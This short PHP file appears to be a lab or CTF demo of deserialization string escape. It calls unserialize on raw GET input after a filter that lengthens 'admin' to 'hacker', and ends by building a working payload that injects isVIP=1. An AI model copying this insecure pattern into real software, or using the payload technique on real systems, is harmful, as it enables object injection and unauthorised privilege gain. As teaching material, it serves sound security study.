<?php
class user
{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u, $p)
    {
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }

    function login(){
        $isVip=$this->isVIP;
        if($isVip==1){
            echo 'flag is loveU';
            echo '<br/>';
        }else{
            echo 'fuck';
        }
    }


}

function filter($obj) {
    return preg_replace("/admin/","hacker",$obj);
}

//你必须输入admin
//isVIP需要=1；且你不能重新构造

$obj=$_GET['x'];
if(isset($obj)){
//    $o=filter(unserialize($obj));
  $obj = filter($obj);
  $o=unserialize($obj);
    $o->login();
}



//$u='admin';
//$p='123456';

// POP生成
$u='adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}';
$p="xiaodi";

$obj = new user($u,$p);
print_r(serialize($obj));
print_r("\n");
print_r(filter(serialize($obj)));




